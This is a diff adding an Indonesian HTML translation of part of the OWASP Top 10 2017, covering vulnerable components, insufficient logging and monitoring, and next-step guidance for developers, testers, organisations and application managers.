+<li>Secara terus menerus meninventarisasi versi komponen dari sisi klien dan sisi server (contoh: framework, library) dan dependensi mereka menggunakan alat seperti versions, DependencyCheck, retire.js, dll.</li>
+<li>Secara terus menerus memonitor sumber seperti CVE dan NVD untuk menemukan kerentanan dalam komponen. Gunakan software composition analysis tools untuk mengotomatiskan proses. Berlangganan pada email peringatan untuk kerentanan keamanan yang berkaitan dengan komponen yang anda gunakan.</li>
+<li>Hanya dapatkan komponen dari sumber resmi dari tautan aman. Utamakan signed packages untuk mengurangi kemungkinan menyertakan komponen yang dimodifikasi dan berbahaya.</li>
+<li>Monitor library dan komponen yang tidak dikelola atau tidak membuat patch keamanan untuk versi lama. Jika patching tidak memungkinkan, pertimbangkan deploying patch virtual untuk memonitor, mendeteksi, atau melindungi dari masalah yang ditemukan.</li>
+</ul>
+<p>Setiap organisasi harus memastikan bahwa ada rencana berkelanjutan untuk memonitoring, triaging, dan menerapkan update atau perubahan konfigurasi selama masa pakai aplikasi atau portfolio.</p>
+<h2 id="contoh-skenario-serangan-8">Contoh Skenario Serangan</h2>
+<p><strong>Skenario #1</strong>: Komponen biasanya berjalan dengan hak yang sama seperti aplikasi itu sendiri, jadi kekurangan pada komponen apa pun dapat mengakibatkan dampak yang serius. Kondisi semacam itu bisa tidak disengaja (mis. Kesalahan pada sisi code) atau disengaja (mis. Pintu belakang di dalam komponen). Beberapa contoh kerentanan komponen yang dapat dieksploitasi yang ditemukan adalah:</p>
+<ul>
+<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638">CVE-2017-5638</a>, kerentanan eksekusi kode jarak jauh Struts 2 yang memungkinkan eksekusi kode arbitrer pada server, telah disalahkan atas pelanggaran yang signifikan.</li>
+<li>Meskipun <a href="https://en.wikipedia.org/wiki/Internet_of_things">internet of things (IoT)</a> seringkali sulit atau tidak mungkin untuk diperbaiki, pentingnya memperbaiki mereka bisa jadi sangat penting (mis. Perangkat biomedis).</li>
+</ul>
+<p>Ada alat otomatis untuk membantu penyerang menemukan sistem yang belum diperbaiki atau salah dalam konfigurasi. Contoh, <a href="https://www.shodan.io/">mesin telusur Shodan IoT</a> dapat membantu Anda menemukan perangkat yang masih terkena [Heartbleed] <a href="https://en.wikipedia.org/wiki/Heartbleed">Heartbleed</a> kerentanan yang telah di-patch pada April 2014.</p>
+<h2 id="referensi-9">Referensi</h2>
+<h3 id="owasp-8">OWASP</h3>
+<ul>
+<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x10-V1-Architecture.md">OWASP Application Security Verification Standard: V1 Architecture, design and threat modelling</a></li>
+<li><a href="https://owasp.org/www-project-dependency-check/">OWASP Dependency Check (for Java and .NET libraries)</a></li>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/10-Map_Application_Architecture">OWASP Testing Guide - Map Application Architecture (OTG-INFO-010)</a></li>
+<li><a href="https://owasp.org/www-community/Virtual_Patching_Best_Practices">OWASP Virtual Patching Best Practices</a></li>
+</ul>
+<h3 id="external-5">External</h3>
+<ul>
+<li><p><a href="https://cdn2.hubspot.net/hub/203759/file-1100864196-pdf/docs/Contrast_-_Insecure_Libraries_2014.pdf">The Unfortunate Reality of Insecure Libraries</a></p></li>
+<li><p><a href="https://www.cvedetails.com/version-search.php">MITRE Common Vulnerabilities and Exposures (CVE) search</a></p></li>
+<li><p><a href="https://nvd.nist.gov/">National Vulnerability Database (NVD)</a></p></li>
+<li><p><a href="https://github.com/retirejs/retire.js/">Retire.js for detecting known vulnerable JavaScript libraries</a></p></li>
+<li><p><a href="https://rubysec.com/">Ruby Libraries Security Advisory Database and Tools</a></p></li>
+</ul>
+<h1 id="a102017-kurangnya-dalam-melakukan-logging-dan-monitoring">A10:2017 Kurangnya dalam Melakukan Logging dan Monitoring</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Ancaman/Vektor Serangan</th>
+<th>Kelemahan Keamanan</th>
+<th>Dampak</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Lvl Akses : Dapat Dieksploitasi 2</td>
+<td>Prevalence 3 : Detectability 1</td>
+<td>Technical 2 : Business</td>
+</tr>
+<tr class="even">
+<td>Eksploitasi logging dan pemantauan/monitoring yang tidak memadai adalah awal/fondasi dari hampir setiap insiden besar. Penyerang bergantung pada kurangnya pemantauan/monitoring dan respon yang tepat waktu untuk mencapai tujuan mereka tanpa terdeteksi.</td>
+<td>Issue tersebut termasuk dalam top 10 berdasarkan <a href="https://owasp.blogspot.com/2017/08/owasp-top-10-2017-project-update.html">industry survey</a>. Salah satu strategi untuk menentukan apakah Anda memiliki pemantauan(monitoring) yang memadai adalah dengan memeriksa log setelah pengujian penetrasi(penetration testing). Tindakan tester/penguji harus direkam secukupnya untuk memahami kerusakan apa yang mungkin mereka timbulkan</td>
+<td>Serangan yang paling sukses dimulai dengan pemeriksaan kerentanan. Membiarkan probe/pemeriksaan seperti itu terus-menerus dapat meningkatkan kemungkinan eksploitasi yang berhasil hingga hampir 100%. Pada tahun 2016, mengidentifikasi pelanggaran membutuhkan rata-rata 191 hari – banyak waktu untuk menimbulkan kerusakan.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="apakah-aplikasi-tersebut-rentan">Apakah Aplikasi Tersebut Rentan?</h2>
+<p>Pencatatan(logging), deteksi, pemantauan(monitoring), dan respons aktif yang tidak memadai terjadi saat:</p>
+<ul>
+<li>Kejadian yang dapat diaudit, seperti login, kegagalan login, dan transaksi bernilai tinggi tidak dicatat.</li>
+<li>Pesan Log untuk peringatan dan kesalahan tidak ada, tidak memadai, atau tidak jelas.</li>
+<li>Logs hanya disimpan secara local.</li>
+<li>Ambang peringatan yang tepat dan proses eskalasi respons tidak tersedia atau efektif. Appropriate alerting thresholds and response escalation processes are not in place or effective.</li>
+<li>Penetrasi Testing dan scan dengan <a href="https://owasp.org/www-community/Vulnerability_Scanning_Tools">DAST</a> tools (seperti <a href="https://owasp.org/www-project-zap/">OWASP ZAP</a>) tidak memacu peringatan.</li>
+<li>Aplikasi tidak dapat mendeteksi, meningkatkan, atau memperingatkan serangan aktif dalam waktu real-time atau mendekati real-time.</li>
+</ul>
+<p>Anda rentan terhadap kebocoran informasi jika Anda membuat pencatatan log dan peringatan event terlihat oleh pengguna atau penyerang (lihat A3: Keterpaparan Informasi Sensitif 2017).</p>
+<h2 id="bagaimana-cara-mencegah">Bagaimana Cara Mencegah?</h2>
+<p>Pada setiap resiko dari data yang disetorkan atau diproses oleh aplikasi :</p>
+<ul>
+<li>Pastikan semua login, kegagalan kontrol akses, dan kegagalan validasi input dari sisi server dapat dapat dimasukkan dengan konteks yang cukup dari user untuk mengidentifikasi akun mencurigakan atau berbahaya, dan ditahan untuk waktu yang cukup untuk mengizinkan analisa forensik yang tertunda.</li>
+<li>Pastikan bahwa log dibuat dalam format yang dapat dengan mudah digunakan oleh solusi log manajemen utama.</li>
+<li>Pastikan transaksi bernilai tinggi memiliki jejak audit dengan kontrol integritas untuk mencegah kerusakan atau terhapus, seperti tabel database yang hanya bisa menambahkan data atau semacamnya.</li>
+<li>Buat monitoring dan peringatan yang efektif agar aktivitas mencurigakan dapat terdeteksi dan direspon secara tepat waktu.</li>
+<li>Buat atau adopsi sebuah respon kejadian dan rencana pemulihan, seperti <a href="https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final">NIST 800-61 rev 2</a> atau nanti.</li>
+</ul>
+<p>Tersedia aplikasi framework proteksi baik komersial maupun opensource seperti <a href="https://owasp.org/www-project-appsensor/">OWASP AppSensor</a>, aplikasi web firewalls seperti <a href="https://owasp.org/www-project-modsecurity-core-rule-set/">OWASP ModSecurity Core Rule Set</a>, dan perangkat lunak korelasi log dengan dasboard dan peringatan yang bisa dibuat sesuai keinginan.</p>
+<h2 id="contoh-skenario-serangan-9">Contoh Skenario Serangan</h2>
+<p><strong>Skenario #1</strong>: Sebuah forum proyek Open Source Perangkat lunak yang dijalankan oleh tim kecil diretas menggunakan kecacatan pada perangkat lunaknya. Para penyerang berhasil menghapus repositori kode sumber internal yang berisi versi berikutnya, dan semua konten forum. Meskipun sumber dapat dipulihkan, kurangnya pemantauan, penebangan, atau peringatan menyebabkan pelanggaran yang jauh lebih buruk.Forum proyek perangkat lunak tidak lagi aktif karena masalah ini.</p>
+<p><strong>Skenario #2</strong>: Penyerang menggunakan pemindaian untuk pengguna menggunakan sandi umum. Mereka dapat mengambil alih semua akun menggunakan kata sandi ini. Untuk semua pengguna lain, pemindaian ini hanya menyisakan satu login palsu. Setelah beberapa hari, ini mungkin akan diulangi dengan sandi yang berbeda.</p>
+<p><strong>Skenario #3</strong>: Sebuah pengecer besar AS dilaporkan memiliki analisis malware internal Sandbox menganalisis lampiran. Perangkat lunak Sandbox telah mendeteksi perangkat lunak yang mungkin tidak diinginkan, tetapi tidak ada yang menanggapi deteksi ini. Sandbox telah mengeluarkan peringatan untuk beberapa waktu sebelum pelanggaran terdeteksi karena transaksi kartu yang curang oleh bank eksternal.</p>
+<h2 id="referensi-10">Referensi</h2>
+<h3 id="owasp-9">OWASP</h3>
+<ul>
+<li><a href="https://owasp.org/www-project-proactive-controls/v3/en/c9-security-logging">OWASP Proactive Controls: Implement Logging and Intrusion Detection</a></li>
+<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x11-V2-Authentication.md">OWASP Application Security Verification Standard: V8 Logging and Monitoring</a></li>
+<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x11-V2-Authentication.md">OWASP Testing Guide: Testing for Detailed Error Code</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html">OWASP Cheat Sheet: Logging</a></li>
+</ul>
+<h3 id="eksternal-4">Eksternal</h3>
+<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/223.html">CWE-223: Omission of Security-relevant Information</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/778.html">CWE-778: Insufficient Logging</a></li>
+</ul>
+<h1 id="d-apa-yang-dilakukan-selanjutnya-untuk-pengembang">+D Apa yang dilakukan selanjutnya untuk pengembang</h1>
+<h2 id="menetapkan--amp-gunakan-proses-keamanan-yang-terulang-dan-kontrol-keamanan-standar">Menetapkan &amp; amp; Gunakan Proses Keamanan yang Terulang dan Kontrol Keamanan Standar</h2>
+<p>Entah Anda baru mengenal keamanan aplikasi web atau sudah sangat mengenal risiko ini, tugas memproduksi aplikasi web yang aman atau memperbaiki yang sudah ada bisa menjadi sulit. Jika Anda harus mengelola portofolio aplikasi yang besar, tugas ini bisa menakutkan.</p>
+<p>Untuk membantu organisasi dan pengembang mengurangi risiko keamanan aplikasi mereka dengan biaya yang efektif, OWASP telah menghasilkan banyak sumber terbuka dan terbuka yang dapat Anda gunakan untuk menangani keamanan aplikasi di organisasi Anda. Berikut ini adalah beberapa dari banyak sumber yang OWASP telah dihasilkan untuk membantu organisasi menghasilkan aplikasi dan API web yang aman. Pada halaman berikutnya, kami menyajikan tambahan sumber daya OWASP yang dapat membantu organisasi dalam memverifikasi keamanan aplikasi dan API mereka</p>
+<table>
+<thead>
+<tr class="header">
+<th>Aktifitas</th>
+<th>Deskripsi</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Persyaratan Keamanan Aplikasi</td>
+<td>Untuk menghasilkan aplikasi web yang aman, Anda harus menentukan sarana aman untuk aplikasi itu. OWASP merekomendasikan Anda menggunakan <a href="https://owasp.org/www-project-application-security-verification-standard/">OWASP Application Security Verification Standard (ASVS)</a> sebagai panduan untuk menetapkan persyaratan keamanan untuk aplikasi Anda. Jika Anda outsourcing, pertimbangkan <a href="https://owasp.org/www-community/OWASP_Secure_Software_Contract_Annex">OWASP Secure Software Contract Annex</a> Lampiran untuk undang-undang kontrak AS, jadi mohon berkonsultasi dengan nasihat hukum yang memenuhi syarat sebelum menggunakan contoh sampel.t_Annex). <strong>Catatan</strong>: Lampiran untuk undang-undang kontrak AS, jadi mohon berkonsultasi dengan nasihat hukum yang memenuhi syarat sebelum menggunakan contoh sampel.</td>
+</tr>
+<tr class="even">
+<td>Arsitektur Keamanan Aplikasi</td>
+<td>Daripada memperkokoh keamanan ke dalam aplikasi dan API Anda, biaya yang jauh lebih efektif untuk merancang keamanan sejak awal. OWASP merekomendasikan <a href="https://cheatsheetseries.owasp.org/">OWASP Prevention Cheat Sheets</a> sebagai titik awal yang baik untuk panduan bagaimana merancang keamanan sejak awal.</td>
+</tr>
+<tr class="odd">
+<td>Kontrol Standar Keamanan</td>
+<td>Membangun kontrol keamanan yang kuat dan bermanfaat sulit dilakukan. Menggunakan seperangkat kontrol keamanan standar secara radikal menyederhanakan pengembangan aplikasi dan API aman. Itu <a href="https://cheatsheetseries.owasp.org/">OWASP Prevention Cheat Sheets</a> adalah titik awal yang baik bagi pengembang, dan banyak kerangka modern sekarang hadir dengan kontrol keamanan standar dan efektif untuk otorisasi, validasi, pencegahan CSRF, dll.</td>
+</tr>
+<tr class="even">
+<td>Siklus Hidup Pengembangan Aman</td>
+<td>Untuk memperbaiki proses yang diikuti organisasi Anda saat membuat aplikasi dan API, OWASP merekomendasikan <a href="https://owasp.org/www-project-samm/">OWASP Software Assurance Maturity Model (SAMM)</a>. Model ini membantu organisasi merumuskan dan menerapkan strategi untuk keamanan perangkat lunak yang disesuaikan dengan risiko spesifik yang dihadapi organisasi mereka.</td>
+</tr>
+<tr class="odd">
+<td>Pendidikan Keamanan Aplikasi</td>
+<td>The <a href="https://owasp.org/www-committee-education-and-training/">OWASP Education Committee</a> menyediakan materi pelatihan untuk membantu mendidik pengembang tentang keamanan aplikasi web. Untuk belajar tentang kerentanan, cobalah <a href="https://owasp.org/www-project-webgoat/">OWASP WebGoat</a>, <a href="https://github.com/jerryhoff/WebGoat.NET">WebGoat.NET</a>,  <a href="https://owasp.org/www-project-node.js-goat/">OWASP NodeJS Goat</a>, <a href="https://owasp.org/www-project-juice-shop/">OWASP Juice Shop Project</a> or the <a href="https://github.com/chuckfw/owaspbwa/">OWASP Broken Web Applications Project</a>. Untuk tetap mengikuti, ayo <a href="https://owasp.org/events/">OWASP AppSec Conference</a>, <a href="https://owasp.org/events/">OWASP Conference Training</a>, atau lokal <a href="https://owasp.org/chapters/">OWASP Chapter meetings</a>.</td>
+</tr>
+</tbody>
+</table>
+<p>TBerikut adalah banyak sumber OWASP tambahan yang tersedia untuk Anda gunakan. Silahkan kunjungi <a href="https://owasp.org/projects/">OWASP Projects</a> pusia, yang mencantumkan semua proyek Unggulan, Lab, dan Inkubator dalam inventarisasi proyek OWASP. Sebagian besar sumber daya OWASP tersedia di situs kami <a href="https://owasp.org/">wiki</a>, dan banyak dokumen OWASP yang bisa dipesan <a href="https://stores.lulu.com/owasp">hardcopy or as eBooks</a>.</p>
+<h1 id="t-apa-tahapan-selanjutnya-untuk-penguji-keamanan">+T Apa Tahapan Selanjutnya untuk Penguji Keamanan</h1>
+<h2 id="menetapkan-pengujian-keamanan-aplikasi-kontinu">Menetapkan Pengujian Keamanan Aplikasi Kontinu</h2>
+<p>Membangun kode dengan aman itu penting. Tapi penting untuk memverifikasi bahwa keamanan yang ingin Anda bangun benar-benar ada, diterapkan dengan benar, dan digunakan di tempat yang seharusnya. Tujuan pengujian keamanan aplikasi adalah untuk memberikan bukti ini. Pekerjaannya sulit dan rumit, dan proses pembangunan modern berkecepatan tinggi seperti Agile dan DevOps telah memberi tekanan ekstrim pada pendekatan dan alat tradisional. Jadi kami sangat menganjurkan Anda untuk memikirkan bagaimana Anda berfokus pada apa yang penting di keseluruhan portofolio aplikasi Anda, dan melakukannya dengan biaya yang efektif.</p>
+<p>Resiko modern bergerak cepat, jadi hari-hari pemindaian atau penetrasi menguji aplikasi untuk kerentanan satu tahun sekali atau sudah lama berlalu. Pengembangan perangkat lunak modern memerlukan pengujian keamanan aplikasi secara terus menerus di seluruh siklus pengembangan perangkat lunak secara keseluruhan. Lihat untuk meningkatkan jaringan pipa pembangunan yang ada dengan otomasi keamanan yang tidak memperlambat pembangunan. Apapun pendekatan yang Anda pilih, pertimbangkan biaya tahunan untuk menguji, triase, remediasi, uji ulang, dan redeploy aplikasi tunggal, dikalikan dengan ukuran portofolio aplikasi Anda.</p>
+<table>
+<thead>
+<tr class="header">
+<th>Aktivitas</th>
+<th>Deskripsi</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Pahami Model Ancaman</td>
+<td>Sebelum memulai pengujian, pastikan Anda mengerti apa yang penting untuk menghabiskan waktu. Prioritas berasal dari model ancaman, jadi jika Anda tidak memilikinya, Anda harus membuatnya sebelum melakukan pengujian. Pertimbangkanlah memakai <a href="https://owasp.org/www-project-application-security-verification-standard/">OWASP ASVS</a> dan <a href="https://owasp.org/www-project-web-security-testing-guide/">OWASP Testing Guide</a> sebagai masukan dan jangan mengandalkan vendor alat untuk memutuskan apa yang penting bagi bisnis Anda.</td>
+</tr>
+<tr class="even">
+<td>Pahami SDLC anda</td>
+<td>Pendekatan Anda terhadap pengujian keamanan aplikasi harus sangat sesuai dengan orang, proses, dan alat yang Anda gunakan dalam Software Development Lifecycle Anda (SDLC). Upaya untuk memaksa langkah ekstra, gerbang, dan ulasan cenderung menyebabkan friksi, dilewati, dan kesusahan untuk berskala. Carilah kesempatan alami untuk mengumpulkan informasi keamanan dan memberi umpan balik ke dalam proses Anda.</td>
+</tr>
+<tr class="odd">
+<td>Strategi Pengujian</td>
+<td>Pilih teknik yang paling sederhana, tercepat, paling akurat untuk memverifikasi setiap persyaratan. <a href="https://owasp.org/www-project-security-knowledge-framework/">OWASP Security Knowledge Framework</a> dan <a href="https://owasp.org/www-project-application-security-verification-standard/">OWASP Application Security Verification Standard</a> dapat menjadi sumber besar persyaratan keamanan fungsional dan nonfungsional dalam pengujian unit dan integrasi Anda. Pastikan untuk mempertimbangkan sumber daya manusia yang dibutuhkan untuk menangani kesalahan positif dari penggunaan perkakas otomatis serta bahaya serius dari negatif palsu.</td>
+</tr>
+<tr class="even">
+<td>Mencapai Cakupan dan Akurasi</td>
+<td>Anda tidak harus mulai menguji semuanya. Fokus pada apa yang penting dan memperluas program verifikasi Anda dari waktu ke waktu. Itu berarti memperluas seperangkat pertahanan keamanan dan risiko yang secara otomatis diverifikasi serta memperluas seperangkat aplikasi dan API yang dilinkupi. Tujuannya adalah untuk mencapai keadaan dimana keamanan penting semua aplikasi dan API Anda diverifikasi secara terus menerus.</td>
+</tr>
+<tr class="odd">
+<td>Jelas Mengomunikasikan Temuan</td>
+<td>Tidak peduli seberapa bagus Anda dalam pengujian, tidak akan ada bedanya kecuali jika Anda mengkomunikasikannya secara efektif. Bangun kepercayaan dengan menunjukkan bahwa Anda mengerti bagaimana aplikasi bekerja. Jelaskan dengan jelas bagaimana hal itu dapat disalahgunakan tanpa "istilah" dan sertakan skenario serangan untuk membuatnya menjadi nyata. Buatlah perkiraan yang realistis tentang betapa sulitnya kerentanan untuk menemukan dan mengeksploitasi, dan seberapa buruknya itu. Akhirnya, sampaikan temuan di tim pengembangan alat yang sudah digunakan, bukan file PDF.</td>
+</tr>
+</tbody>
+</table>
+<h1 id="o-apa-tahapan-selanjutnya-un-organisasi">+O Apa Tahapan Selanjutnya un Organisasi</h1>
+<h2 id="mulai-program-keamanan-aplikasi-anda-sekarang">Mulai Program Keamanan Aplikasi Anda Sekarang</h2>
+<p>Keamanan aplikasi tidak lagi menjadi pilihan. Antara meningkatnya serangan dan tekanan peraturan, organisasi harus membangun proses dan kemampuan yang efektif untuk mengamankan aplikasi dan API mereka. Dengan banyaknya jumlah kode dalam banyak aplikasi dan API yang sudah berproduksi, banyak organisasi berjuang untuk mengatasi sejumlah besar kerentanan.</p>
+<p>OWASP merekomendasikan organisasi membuat program keamanan aplikasi untuk mendapatkan wawasan dan meningkatkan keamanan di aplikasi dan API mereka. Mencapai keamanan aplikasi memerlukan banyak bagian yang berbeda dari sebuah organisasi untuk bekerja sama secara efisien, termasuk keamanan dan audit, pengembangan perangkat lunak, bisnis, dan manajemen eksekutif. Keamanan harus terlihat dan terukur, sehingga semua pemain yang berbeda dapat melihat dan memahami postur keamanan aplikasi organisasi. Fokus pada kegiatan dan hasil yang benar-benar membantu meningkatkan keamanan perusahaan dengan menghilangkan atau mengurangi risiko. <a href="https://owasp.org/www-project-samm/">OWASP SAMM</a> dan <a href="https://owasp.org/www-pdf-archive/Owasp-ciso-guide.pdf">OWASP Application Security Guide for CISOs</a> adalah sumber sebagian besar kegiatan utama dalam daftar ini.</p>
+<h3 id="memulai">Memulai</h3>
+<ul>
+<li>Dokumentasikan semua aplikasi dan aset data terkait. Organisasi yang lebih besar harus mempertimbangkan untuk menerapkan Configuration Management Database (CMDB) untuk tujuan ini.</li>
+<li>Menetapkan <a href="https://owasp.org/www-project-samm/">aplikasi program keamanan</a> dan dorong proses adopsi.</li>
+<li>Laksanakan <a href="https://owasp.org/www-project-samm/">analisis kesenjangan kemampuan</a> dengan membandingkan organisasi Anda dengan organisasi sejenis Anda untuk menentukan daerah perbaikan penting dan rencana pelaksanaan.</li>
+<li>Dapatkan persetujuan manajemen dan buat sebuah <a href="https://owasp.org/www-project-samm/">kampanye kesadaran keamanan aplikasi</a> untuk seluruh organisasi IT.</li>
+</ul>
+<h3 id="pendekatan-pendekatan-berbasis-risiko">Pendekatan Pendekatan Berbasis Risiko</h3>
+<ul>
+<li>Identifikasi <a href="https://owasp.org/www-project-samm/">kebutuhan proteksi</a> dari <a href="https://owasp.org/www-project-samm/">portfolio aplikasi anda</a> dari perspektif bisnis. Hal ini harus didorong sebagian oleh undang-undang privasi dan peraturan lainnya yang relevan dengan aset data yang dilindungi.</li>
+<li>Menetapkan <a href="https://owasp.org/www-community/OWASP_Risk_Rating_Methodology">model penilaian resiko umum</a> dengan seperangkat kemungkinan dan faktor dampak yang konsisten yang mencerminkan toleransi organisasi terhadap risiko Anda.</li>
+<li>Dengan demikian mengukur dan memprioritaskan semua aplikasi dan API Anda. Tambahkan hasilnya ke CMDB Anda.</li>
+<li>Tetapkan pedoman penjaminan untuk menentukan cakupan dan tingkat ketelitian yang tepat.</li>
+</ul>
+<h3 id="aktifkan-dengan-dasar-yang-kuat">Aktifkan dengan Dasar yang Kuat</h3>
+<ul>
+<li>Tetapkan satu set fokus <a href="https://owasp.org/www-project-samm/">kebijakan dan standar</a> yang memberikan dasar keamanan aplikasi untuk semua tim pengembangan untuk dipatuhi.</li>
+<li>Tentukan seperangkat <a href="https://owasp.org/www-project-security-knowledge-framework/">kontrol keamanan yang dapat digunakan kembali</a> yang melengkapi kebijakan dan standar ini dan memberikan panduan desain dan pengembangan untuk penggunaannya.</li>
+<li>Menetapkan <a href="https://owasp.org/www-project-samm/">kurikulum pelatihan keamanan aplikasi</a> yang dibutuhkan dan ditargetkan pada peran dan topik pembangunan yang berbeda.</li>
+</ul>
+<h3 id="mengintegrasikan-keamanan-ke-proses-yang-ada">Mengintegrasikan Keamanan ke Proses yang Ada</h3>
+<ul>
+<li>Tentukan dan integrasikan <a href="https://owasp.org/www-project-samm/">implementasi yang aman</a> kegiatan ke dalam proses pengembangan dan operasional yang ada.</li>
+<li>Kegiatan meliputi <a href="https://owasp.org/www-project-samm/">pemodelan ancaman</a>, dan remediasi.</li>
+<li>Berikan ahli subjek dan <a href="https://owasp.org/www-project-samm/">layanan pendukung untuk tim pengembangan dan proyek</a> untuk menjadi sukses.</li>
+</ul>
+<h3 id="menyediakan-visibilitas-manajemen">Menyediakan Visibilitas Manajemen</h3>
+<ul>
+<li>Kelola dengan metrik. Dorong perbaikan dan keputusan pendanaan berdasarkan data metrik dan analisis yang diambil. Metrik meliputi kepatuhan terhadap praktik dan aktivitas keamanan, kerentanan yang diperkenalkan, kerentanan yang dikurangi, cakupan aplikasi, kepadatan cacat menurut jenis dan jumlah contoh, dll.</li>
+<li>Menganalisis data dari kegiatan implementasi dan verifikasi untuk mencari akar penyebab dan pola kerentanan untuk mendorong perbaikan strategis dan sistemik di seluruh perusahaan. Belajarlah dari kesalahan dan berikan insentif positif untuk mempromosikan perbaikan</li>
+</ul>
+<h1 id="-a-apa-selanjutnya-untuk-manajer-aplikasi">+ A: Apa selanjutnya untuk Manajer Aplikasi</h1>
+<h2 id="mengelola-siklus-aplikasi-penuh-hidup">Mengelola Siklus Aplikasi Penuh Hidup</h2>
+<p>Aplikasi milik sistem yang paling kompleks secara teratur membuat dan memelihara adalah manusia. Manajemen TI untuk sebuah aplikasi harus dilakukan oleh spesialis TI yang bertanggung jawab atas keseluruhan siklus hidup aplikasi. Kami menyarankan untuk menetapkan peran sebagai manajer aplikasi sebagai mitra teknis bagi pemilik aplikasi. Manajer aplikasi bertanggung jawab atas keseluruhan siklus hidup aplikasi dari perspektif TI, mulai dari mengumpulkan persyaratan sampai proses sistem pensiun, yang sering diabaikan.</p>
+<h2 id="persyaratan-dan-manajemen-sumber-daya">Persyaratan dan Manajemen Sumber Daya</h2>
+<ul>
+<li>Mengumpulkan dan menegosiasikan persyaratan bisnis untuk aplikasi dengan bisnis, termasuk persyaratan perlindungan berkenaan dengan kerahasiaan, keaslian, integritas dan ketersediaan semua aset data, dan logika bisnis yang diharapkan.</li>
+<li>Kompilasi persyaratan teknis termasuk persyaratan keamanan fungsional dan nonfungsional.</li>
+<li>Merencanakan dan menegosiasikan anggaran yang mencakup semua aspek desain, pengembangan, pengujian dan operasi, termasuk kegiatan keamanan.</li>
+</ul>
+<h2 id="permohonan-untuk-proposal-rfp-dan-kontrak">Permohonan untuk Proposal (RFP) dan Kontrak</h2>
+<ul>
+<li>Negosiasikan persyaratan dengan pengembang internal atau eksternal, termasuk pedoman dan persyaratan keamanan sehubungan dengan program keamanan Anda, misal: SDLC, praktik terbaik.</li>
+<li>Beri nilai pemenuhan semua persyaratan teknis, termasuk tahap perencanaan dan perancangan.</li>
+<li>Negosiasikan semua persyaratan teknis, termasuk disain, keamanan, dan perjanjian tingkat layanan (SLA).</li>
+<li>Mengadopsi template dan daftar periksa, seperti <a href="https://owasp.org/www-community/OWASP_Secure_Software_Contract_Annex">OWASP Secure Software Contract Annex</a>. Catatan: Lampiran ini untuk hukum kontrak AS, jadi mohon berkonsultasi dengan nasihat hukum yang memenuhi syarat sebelum menggunakan contoh sampel.</li>
+</ul>
+<h2 id="perencanaan-dan-desain">Perencanaan dan Desain</h2>
+<ul>
+<li>Negosiasikan perencanaan dan desain dengan para pengembang dan pemegang saham internal, misal: spesialis keamanan</li>
+<li>Tentukan arsitektur keamanan, kontrol, dan tindakan penanggulangan yang sesuai dengan kebutuhan perlindungan dan tingkat ancaman yang diharapkan. Ini harus didukung oleh spesialis keamanan.</li>
+<li>Pastikan pemilik aplikasi menerima risiko yang tersisa atau menyediakan sumber daya tambahan.</li>
+<li>Daya dalam setiap kecepatan, pastikan dibuatkan cerita keamanan yang mencakup batasan yang ditambahkan untuk persyaratan yang tidak fungsional.</li>
+</ul>
+<h2 id="penyebaran-pengujian-dan-peluncuran">Penyebaran, pengujian dan peluncuran</h2>
+<ul>
+<li>Mengotomatiskan penerapan aplikasi, antarmuka, dan semua komponen yang dibutuhkan dengan aman, termasuk otorisasi yang diperlukan.</li>
+<li>Menguji fungsi teknis dan integrasi dengan arsitektur TI dan mengkoordinasikan tes bisnis.</li>
+<li>Buat kasus uji "penggunaan" dan "penyalahgunaan" dari perspektif teknis dan bisnis.</li>
+<li>Mengelola tes keamanan sesuai dengan proses internal, kebutuhan perlindungan, dan tingkat ancaman yang diasumsikan oleh aplikasi.</li>
+<li>Letakkan aplikasi dalam operasi dan migran dari aplikasi yang sebelumnya digunakan jika diperlukan.</li>
+<li>Selesaikan semua dokumentasi, termasuk CMDB dan arsitektur keamanan.</li>
+</ul>
+<h2 id="operasi-dan-manajemen-perubahan">Operasi dan Manajemen Perubahan</h2>
+<ul>
+<li>Operasi harus mencakup panduan untuk pengelolaan keamanan aplikasi (misalnya manajemen patch).</li>
+<li>Naikkan kesadaran keamanan pengguna dan kelola konflik tentang kegunaan vs keamanan.</li>
+<li>Merencanakan dan mengelola perubahan, mis. bermigrasi ke versi baru dari aplikasi atau komponen lain seperti OS, middleware, dan perpustakaan.</li>
+<li>Perbarui semua dokumentasi, termasuk dalam basis data manajemen perubahan (CMDB) dan arsitektur keamanan, kontrol, dan penanggulangan, termasuk runbook atau dokumentasi proyek apa pun.</li>
+</ul>
+<h2 id="sistem-pensiun">Sistem Pensiun</h2>
+<ul>
+<li>Data yang dibutuhkan harus diarsipkan. Semua data lainnya harus dilepas dengan aman.</li>
+<li>Pelepasan aplikasi dengan aman, termasuk menghapus akun dan peran dan izin yang tidak terpakai.</li>
+<li>Tetapkan status aplikasi Anda ke pensiunan di CMDB.</li>
+</ul>
+<h1 id="-r-catatan-tentang-resiko">+ R Catatan Tentang Resiko</h1>
+<h2 id="ini-tentang-resiko-yang-melihatkan-kelemahan">Ini tentang Resiko yang Melihatkan Kelemahan</h2>
+<p>Metodologi Rating Resiko untuk Top 10 didasarkan pada Metodologi Penilaian Resiko OWASP. Untuk setiap kategori Top 10, kami memperkirakan resiko khas yang masing-masing kelemahan diperkenalkan pada aplikasi web biasa dengan melihat faktor kemungkinan umum dan faktor dampak untuk setiap kelemahan umum. Kami kemudian memesan untuk Top 10 sesuai dengan kelemahan yang biasanya mengenalkan resiko paling signifikan ke aplikasi. Faktor-faktor ini dapat diperbarui dengan setiap rilis, Top 10 terbaru saat berbagai hal berubah dan berkembang.</p>
